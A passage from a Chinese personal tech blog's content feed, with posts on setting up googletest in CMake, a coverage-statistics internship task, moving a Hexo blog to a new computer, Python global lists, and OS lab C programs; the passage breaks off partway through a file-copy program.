align="center" id="29"></li><li><p>显示下面的信息表明编译成功（显示<code>Error running</code>，不用管他），生成的<code>libgtestd.a</code>即为gtest的库文件，项目中引用这个库文件就能使用gtest了。</p><img src="https://i.loli.net/2021/10/06/c2JyQ41X3nImkTK.png" width="900" height="200" alt="图片名称" align="center" id="30"></li></ol><h1 id="2-使用googletest"><a class="markdownIt-Anchor" href="#2-使用googletest"></a> 2 使用googletest</h1><h2 id="21-引入库"><a class="markdownIt-Anchor" href="#21-引入库"></a> 2.1 引入库</h2><p>新建测试项目<code>cliontest</code>，将libgtestd.a文件拷贝到该代码根路径的lib路径下，在CMakeList.txt中加上以下内容：</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 添加上库文件的路径，注意相对路径</span></span><br><span class="line"><span class="keyword">link_directories</span>(lib/)</span><br><span class="line"><span class="comment"># 添加可执行文件</span></span><br><span class="line"><span class="keyword">add_executable</span>(cliontest main.cpp)</span><br><span class="line"><span class="comment"># 链接gtest库文件</span></span><br><span class="line"><span class="keyword">target_link_libraries</span>(cliontest libgtestd.a)</span><br></pre></td></tr></table></figure><h2 id="22-引入头文件"><a class="markdownIt-Anchor" href="#22-引入头文件"></a> 2.2 引入头文件</h2><p>拷贝<code>googletest/include</code>下的<code>gtest</code>目录到项目下的<code>include</code>目录下，然后在CMakeList.txt中添加上对应的调用：</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include_directories</span>(</span><br><span class="line">    <span class="keyword">include</span>/</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>然后在代码中添加头文件gtest/gtest.h就可以使用了。</p><h2 id="23-测试"><a class="markdownIt-Anchor" href="#23-测试"></a> 2.3 测试</h2><p>修改<code>main.cpp</code>并运行：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"gtest/gtest.h"</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">TEST(add, zero) &#123;</span><br><span class="line">    EXPECT_EQ(<span class="number">0</span>, add(<span class="number">0</span>, <span class="number">0</span>));</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">TEST(add, positive_number) &#123;</span><br><span class="line">    EXPECT_EQ(<span class="number">3</span>, add(<span class="number">1</span>, <span class="number">2</span>));</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">TEST(add, negative_number) &#123;</span><br><span class="line">    EXPECT_EQ(<span class="number">-3</span>, add(<span class="number">-1</span>, <span class="number">-2</span>));</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    ::testing::InitGoogleTest();</span><br><span class="line">    <span class="keyword">return</span> RUN_ALL_TESTS();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="3-gtest的使用教程"><a class="markdownIt-Anchor" href="#3-gtest的使用教程"></a> 3 gtest的使用教程</h1><p>参考文档：<a href="https://github.com/google/googletest/blob/master/googletest/docs/primer.md" target="_blank" rel="noopener">Googletest Primer</a>，google官方出品。</p><p><a href="https://www.dyxmq.cn/program/usage-of-googletest.html" target="_blank" rel="noopener">https://www.dyxmq.cn/program/usage-of-googletest.html</a></p><h1 id="4-参考"><a class="markdownIt-Anchor" href="#4-参考"></a> 4 参考</h1><ul><li><a href="https://meishizaolunzi.com/cmake-an-zhuang-zhi-nan/" target="_blank" rel="noopener">CMake 安装指南</a></li><li></li></ul>]]></content>
      
      
      <categories>
          
          <category> C++ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>基于SR的全量/增量覆盖率统计</title>
      <link href="/2021/09/27/%E5%9F%BA%E4%BA%8ESR%E7%9A%84%E5%85%A8%E9%87%8F%E5%A2%9E%E9%87%8F%E8%A6%86%E7%9B%96%E7%8E%87%E7%BB%9F%E8%AE%A1/"/>
      <url>/2021/09/27/%E5%9F%BA%E4%BA%8ESR%E7%9A%84%E5%85%A8%E9%87%8F%E5%A2%9E%E9%87%8F%E8%A6%86%E7%9B%96%E7%8E%87%E7%BB%9F%E8%AE%A1/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="1-情景导入"><a class="markdownIt-Anchor" href="#1-情景导入"></a> 1 情景导入</h1><p>2021.09.26华为实习任务复现，要求实现基于SR的全量/增量覆盖率统计。</p><p>源代码：<a href="https://gitee.com/dragon-liu/RB_01" target="_blank" rel="noopener">https://gitee.com/dragon-liu/RB_01</a></p><h1 id="2-部门现状"><a class="markdownIt-Anchor" href="#2-部门现状"></a> 2 部门现状</h1><ol><li><p>当前的代码覆盖率只能基于整个代码库进行统计，无法便捷跟踪每个需求引起的覆盖率变化，版本管理成本很高。</p><blockquote><p><strong>方案</strong>：基于SR的全量/增量覆盖率统计</p></blockquote></li><li><p>其次，脚本使用Perl语言编写，晦涩难懂，没有维护人员。</p><blockquote><p><strong>编程语言</strong>：Shell + Python</p></blockquote></li></ol><h1 id="3-解决方案"><a class="markdownIt-Anchor" href="#3-解决方案"></a> 3 解决方案</h1><ol><li>通过git跟踪不同需求引入的代码变更</li><li>基于变更代码生成差异文件：强行cherry-pick<ul><li>无冲突，直接做全量/增量分析，结果是准确的</li><li>有冲突需，自己获取差异代码行，结果是近似的<ul><li>根据SR获取commit id列表</li><li>以最后一笔提交为标准</li><li>倒序遍历commit id，找出每次提交的代码行（倒序的原因：一般的，越新的commit对当前代码库影响越大）</li></ul></li></ul></li><li>利用lcov以及addlcov生成对应需求的全量/增量覆盖率报告</li><li>通过genhtml工具和python工程库生成html报告</li><li>借助Jenkins定时运行脚本与发送邮件</li></ol><h1 id="4-jenkins使用"><a class="markdownIt-Anchor" href="#4-jenkins使用"></a> 4 Jenkins使用</h1><h2 id="41-ubuntu20安装jenkins"><a class="markdownIt-Anchor" href="#41-ubuntu20安装jenkins"></a> 4.1 Ubuntu20安装Jenkins</h2><ul><li><a href="https://cloud.tencent.com/developer/article/1666282" target="_blank" rel="noopener">如何在 Ubuntu 20.04 上安装 Jenkins</a></li><li><a href="https://blog.csdn.net/qq_35114214/article/details/88747597" target="_blank" rel="noopener">Ubuntu环境下Jenkins安装、卸载、配置</a></li></ul><h2 id="42-配置构建任务"><a class="markdownIt-Anchor" href="#42-配置构建任务"></a> 4.2 配置构建任务</h2><ul><li><a href="https://blog.csdn.net/qq_42559485/article/details/108511066" target="_blank" rel="noopener">Jenkins配置git仓库</a></li><li><a href="https://blog.csdn.net/u012599988/article/details/81871596" target="_blank" rel="noopener">Jenkins 之插件 Publish HTML reports 的使用</a></li></ul><h2 id="43-邮件发送"><a class="markdownIt-Anchor" href="#43-邮件发送"></a> 4.3 邮件发送</h2><ul><li><a href="https://blog.csdn.net/songjiaping/article/details/51496977" target="_blank" rel="noopener">jenkins构建后邮件发送</a></li><li><a href="https://www.cnblogs.com/lelexiong/p/9037807.html" target="_blank" rel="noopener">jenkins构建邮件自动发送，测试邮件发送成功，构建项目邮件发送不成功的问题</a></li><li><a href="https://www.cnblogs.com/t-ae/p/10186157.html" target="_blank" rel="noopener">jenkins构建任务后发送邮件</a></li><li><a href="https://blog.csdn.net/weixin_34199405/article/details/94286501" target="_blank" rel="noopener">jenkins发送邮件失败“No emails were triggered”</a></li></ul><p>本地复现使用的Jenkins自带的邮件提醒功能；华为实习过程中，自己编写脚本进行邮件提醒。</p><p>具体实现详见 博客：<code>Jenkins配置定时发送邮件功能</code></p><h1 id="关于报错"><a class="markdownIt-Anchor" href="#关于报错"></a> 关于报错</h1><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">###强制回滚到某版本</span></span><br><span class="line">git reset --hard 36409abd22dcc9f9252152b34fa9e929f7c883ec</span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">###解决：https://stackoverflow.com/questions/3411048/unexpected-operator-in-shell-programming/3411061</span></span><br><span class="line">./srCover.sh: 17: [: h: unexpected operator </span><br><span class="line">./srCover.sh: 21: [: h: unexpected operator</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> C++ </category>
          
          <category> 环境与工具 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Hexo迁移到新电脑</title>
      <link href="/2021/09/21/Hexo%E8%BF%81%E7%A7%BB%E5%88%B0%E6%96%B0%E7%94%B5%E8%84%91/"/>
      <url>/2021/09/21/Hexo%E8%BF%81%E7%A7%BB%E5%88%B0%E6%96%B0%E7%94%B5%E8%84%91/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="0-情景导入"><a class="markdownIt-Anchor" href="#0-情景导入"></a> 0 情景导入</h1><p>换了一台电脑，将旧电脑的hexo博客写作环境迁移到新电脑上。</p><h1 id="1-git下载及配置"><a class="markdownIt-Anchor" href="#1-git下载及配置"></a> 1 Git下载及配置</h1><ol><li>从官网Git下载git并安装，下面设置无密push+pull；</li><li>打开git bash，在用户主目录(其他目录也可)下运行：<code>ssh-keygen -t rsa -C &quot;youremail@example.com&quot;</code> 把其中的邮件地址换成自己的邮件地址，然后一路回车；</li><li>最后完成后，会在用户主目录下生成.ssh目录，里面有id_rsa和id_rsa.pub两个文件，这两个就是SSH key密钥对，id_rsa是私钥，千万不能泄露出去，id_rsa.pub是公钥，可以放心地告诉任何人；</li><li>登陆GitHub，打开「Settings」-&gt;「SSH and GPG keys」，然后点击「new SSH key」，填上任意Title，在Key文本框里粘贴公钥id_rsa.pub文件的内容（千万不要粘贴成私钥了！），最后点击「Add SSH Key」，你就应该看到已经添加的Key。</li><li>注意：不要在git版本库中运行ssh，然后又将它提交，这样就把密码泄露出去了</li></ol><h1 id="2-安装nodejs"><a class="markdownIt-Anchor" href="#2-安装nodejs"></a> 2 安装Node.js</h1><ol><li>Hexo基于Node.js，Node.js下载地址：<a href="https://link.zhihu.com/?target=https%3A//nodejs.org/en/download/" target="_blank" rel="noopener">Download | Node.js</a> 下载安装包，注意安装Node.js会包含环境变量及npm的安装，安装后，检测Node.js是否安装成功，在命令行中输入 <code>node -v</code>；</li><li>检测npm是否安装成功，在命令行中输入<code>npm -v</code></li></ol><h1 id="3-安装hexo"><a class="markdownIt-Anchor" href="#3-安装hexo"></a> 3 安装Hexo</h1><p>新建文件夹，在此文件夹内使用npm命令全局安装Hexo，输入：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cnpm install -g hexo-cli</span><br></pre></td></tr></table></figure><p>输入<code>hexo -v</code>检查是否安装成功。</p><blockquote><p>npm加速：</p><ol><li><p>装cnpm</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;    npm install -g cnpm --registry=https://registry.npm.taobao.org</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></li></ol></blockquote><blockquote><ol start="2"><li><p>使用cnpm</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;    cnpm install xxx</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></li></ol></blockquote><blockquote><p>参考：<a href="https://cloud.tencent.com/developer/article/1372949" target="_blank" rel="noopener">npm使用国内镜像加速的几种方法</a></p></blockquote><h1 id="4-复制原电脑上的数据"><a class="markdownIt-Anchor" href="#4-复制原电脑上的数据"></a> 4 复制原电脑上的数据</h1><h2 id="41-需要复制的"><a class="markdownIt-Anchor" href="#41-需要复制的"></a> 4.1 需要复制的</h2><ul><li>_config.yml：站点配置</li><li>package.json：说明使用那些包</li><li>scaffolds：文章的模板</li><li>source：自己写的博客文件</li><li>themes：主题</li><li>.gitignore：限定在提交的时候哪些文件可以忽略</li></ul><h2 id="42-需要删除的"><a class="markdownIt-Anchor" href="#42-需要删除的"></a> 4.2 需要删除的</h2><ul><li>.git：无论是在站点根目录下，还是主题目录下的.git文件，都可以删掉。</li><li>node_modules：在用<code>npm install</code>会重新生成</li><li>public：<code>hexo g</code>会重新生成</li><li>.deploy_git：在使用hexo d时也会重新生成</li><li>db.json文件</li></ul><p>其实上面这些文件也就是.gitignore文件里面记载的可以忽略的内容。</p><h1 id="5-npm-install"><a class="markdownIt-Anchor" href="#5-npm-install"></a> 5 npm install</h1><p>在git bash中切换目录到新拷贝的文件夹里，使用<code>npm install</code> 命令，进行模块安装。很明显我们这里<font color="red">没用hexo init初始化</font>，因为有的文件我们已经拷贝生成过来了，所以不必用hexo init去整体初始化，如果不慎在此时用了hexo init，则站点的配置文件_config.yml里面内容会被清空使用默认值，所以这一步一定要慎重，不要用hexo init。</p><h1 id="6-安装其他必要组件"><a class="markdownIt-Anchor" href="#6-安装其他必要组件"></a> 6 安装其他必要组件</h1><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-deployer-git --save <span class="comment"># 为了使用hexo d来部署到git上 </span></span><br><span class="line">npm install hexo-generator-feed --save <span class="comment"># 为了建立RSS订阅</span></span><br><span class="line">npm install hexo-generator-sitemap --save <span class="comment"># 为了建立站点地图</span></span><br></pre></td></tr></table></figure><p>插件安装后，有的需要对配置文件_config.yml进行配置，具体怎么配置，可以参考上面插件在github主页上的具体说明</p><h1 id="7-验证"><a class="markdownIt-Anchor" href="#7-验证"></a> 7 验证</h1><p>首先本地执行，在博客根目录下执行：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hexo g</span><br><span class="line">hexo s</span><br></pre></td></tr></table></figure><p>此时可访问浏览器：<a href="http://localhost:4000/" target="_blank" rel="noopener">http://localhost:4000/</a> ，查看是否转移成功。</p><p>接下来验证部署，执行：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo g</span><br></pre></td></tr></table></figure><p>在线访问出错，无法访问。开始排查：</p><ol><li><p>.deploy_git文件夹内的文件大小均为0kb，也就是生成了一些空文件；</p></li><li><p><font color="pink">public文件夹内的文件大小均为0kb，但是本地可以正常访问，不知道为啥</font></p></li><li><p>其实在执行<code>hexo s</code>时，后台存在报错</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">INFO  Hexo is running at http://localhost:4000 . Press Ctrl+C to stop.</span><br><span class="line">(node:23336) Warning: Accessing non-existent property <span class="string">'lineno'</span> of module exports inside circular dependency</span><br><span class="line">(Use `node --trace-warnings ...` to show <span class="built_in">where</span> the warning was created)</span><br><span class="line">(node:23336) Warning: Accessing non-existent property <span class="string">'column'</span> of module exports inside circular dependency</span><br><span class="line">(node:23336) Warning: Accessing non-existent property <span class="string">'filename'</span> of module exports inside circular dependency</span><br><span class="line">(node:23336) Warning: Accessing non-existent property <span class="string">'lineno'</span> of module exports inside circular dependency</span><br><span class="line">(node:23336) Warning: Accessing non-existent property <span class="string">'column'</span> of module exports inside circular dependency</span><br><span class="line">(node:23336) Warning: Accessing non-existent property <span class="string">'filename'</span> of module exports inside circular dependency</span><br></pre></td></tr></table></figure><p>解决方法：Node版本太高，切换一个低版本Node可以（我这里是14.17.6切换成12.5.0就没有这个问题了）</p></li><li><p>问题已解决，可以在线访问博客了。</p></li></ol><h1 id="参考"><a class="markdownIt-Anchor" href="#参考"></a> 参考</h1><ul><li><a href="https://zhuanlan.zhihu.com/p/26625249" target="_blank" rel="noopener">GitHub+Hexo 搭建个人网站详细教程</a></li><li><a href="https://www.zhihu.com/question/21193762" target="_blank" rel="noopener">使用hexo，如果换了电脑怎么更新博客？</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 环境与工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python-全局变量-list</title>
      <link href="/2021/06/27/Python-%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F-list/"/>
      <url>/2021/06/27/Python-%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F-list/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="1-list"><a class="markdownIt-Anchor" href="#1-list"></a> 1 List</h1><p><strong>python中list作为全局变量无需global声明的原因</strong>：</p><blockquote><p><a href="https://www.cnblogs.com/yym2013/p/5915980.html" target="_blank" rel="noopener">https://www.cnblogs.com/yym2013/p/5915980.html</a></p></blockquote><p>python中list变量作为全局变量时，在函数中可以直接修改。</p><p>而普通变量则需要先在函数中global声明，否则会报错。</p><p>例如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="number">1</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fun</span><span class="params">()</span>:</span></span><br><span class="line">　　<span class="keyword">global</span> a</span><br><span class="line">　　a = <span class="number">2</span></span><br><span class="line">    </span><br><span class="line">b = [<span class="number">1</span>,<span class="number">2</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fun</span><span class="params">()</span>:</span></span><br><span class="line">　　b[<span class="number">0</span>] = <span class="number">2</span></span><br></pre></td></tr></table></figure><p>在函数中直接修改list则是可以的。</p><p>原因是：</p><p>普通变量如果在函数中赋值</p><p><code>a = 2</code></p><p>会有歧义。因为它既可以是表示引用全局变量a，也可以是创建一个新的局部变量，所以在python中，默认它的行为是创建局部变量，除非显式声明global。</p><p>而对列表list变量进行赋值</p><p><code>b[0] = 2</code></p><p>则不会有歧义。它是“明确的”，因为如果把b当作是局部变量的话，它会报KeyError，所以它只能是引用全局的b,故不需要多此一举显式声明global。</p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>操作系统实验</title>
      <link href="/2021/04/05/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%9E%E9%AA%8C/"/>
      <url>/2021/04/05/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%9E%E9%AA%8C/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="考试"><a class="markdownIt-Anchor" href="#考试"></a> 考试</h1><ul><li>多线程+多进程api使用</li><li>scanf不用，不用格式化输出</li><li>时间段提交特定题目</li><li>自己电脑</li><li></li></ul><h1 id="task-1-熟悉linux"><a class="markdownIt-Anchor" href="#task-1-熟悉linux"></a> Task 1 熟悉Linux</h1><p>详见博客 <code>Linux操作手册</code></p><h1 id="task-2-文件读写"><a class="markdownIt-Anchor" href="#task-2-文件读写"></a> Task 2 文件读写</h1><h2 id="21-echo"><a class="markdownIt-Anchor" href="#21-echo"></a> 2.1 echo</h2><ul><li>myecho.c的功能与系统echo程序相同</li><li>接受命令行参数，并将参数打印出来</li><li><strong>运行程序后前面出现<code>./myecho</code></strong><ul><li><strong>argc</strong> 是指传入参数的个数，</li><li><strong>argv[]</strong> 是一个指针数组，指向传递给程序的每个参数。第一个参数就是<code>./myecho</code>，所以从第二个参数开始打印即可。</li></ul></li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">( <span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[] )</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>( argc == <span class="number">0</span>  )&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">for</span>( <span class="keyword">int</span> i=<span class="number">1</span>; i&lt;argc; i++ )&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%s "</span>, argv[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="22-cat"><a class="markdownIt-Anchor" href="#22-cat"></a> 2.2 cat</h2><ul><li>mycat.c的功能与系统cat程序相同</li><li>mycat将指定的文件内容输出到屏幕，例子如下：</li><li>要求使用系统调用open/read/write/close实现</li><li><strong>TODO</strong><ul><li>文件内容超出maxn</li><li>cat+空格命令</li></ul></li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">( <span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[] )</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>( argc == <span class="number">0</span>  )&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">for</span>( <span class="keyword">int</span> i=<span class="number">1</span>; i&lt;argc; i++ )&#123;</span><br><span class="line">            <span class="keyword">int</span> fd = <span class="built_in">open</span>(argv[i], O_RDONLY);<span class="comment">//只读</span></span><br><span class="line">            <span class="keyword">if</span>( fd==<span class="number">-1</span> )&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"mycat: %s: No such file or directory\n"</span>, argv[i]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">char</span> *buf;</span><br><span class="line">                <span class="keyword">int</span> maxn = <span class="number">10000</span>;<span class="comment">//接受最大字符数</span></span><br><span class="line">                buf = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(maxn);</span><br><span class="line">                <span class="keyword">int</span> rd = <span class="built_in">read</span>(fd, buf, maxn);</span><br><span class="line">                <span class="keyword">if</span>( rd==<span class="number">-1</span> )&#123;<span class="comment">//读取失败</span></span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">"Read failed!\n"</span>);</span><br><span class="line">                    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span>( rd==<span class="number">0</span> )&#123;<span class="comment">//读取到了文件末尾</span></span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span>&#123;<span class="comment">//正常读取</span></span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">"%s"</span>, buf);</span><br><span class="line">                    <span class="built_in">close</span>(fd);<span class="comment">//关闭文件</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="23-cp"><a class="markdownIt-Anchor" href="#23-cp"></a> 2.3 cp</h2><ul><li>mycp.c的功能与系统cp程序相同</li><li>将源文件复制到目标文件，例子如下：</li><li>要求使用系统调用open/read/write/close实现</li><li><strong>TODO</strong></li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span 